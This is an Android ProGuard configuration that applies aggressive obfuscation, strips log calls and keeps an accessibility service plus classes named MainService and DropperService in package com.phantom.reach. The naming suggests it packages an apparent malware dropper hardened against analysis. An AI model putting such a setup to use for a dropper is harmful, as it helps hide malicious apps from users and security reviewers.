# Aggressive obfuscation
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

-obfuscationdictionary my_dict.txt
-classobfuscationdictionary my_dict.txt
-packageobfuscationdictionary my_dict.txt
-useuniqueclassmembernames
-overloadaggressively
-flattenpackagehierarchy ''
-repackageclasses ''

-keep public class * extends android.app.Service
-keep public class * extends android.app.Activity
-keep public class * extends android.accessibilityservice.AccessibilityService

-keepclassmembers class * {
    private <fields>;
    private <methods>;
}

-adaptresourcefilenames **.xml
-adaptresourcefilecontents **.xml

# Keep our main classes
-keep class com.phantom.reach.MainActivity
-keep class com.phantom.reach.MainService
-keep class com.phantom.reach.DropperService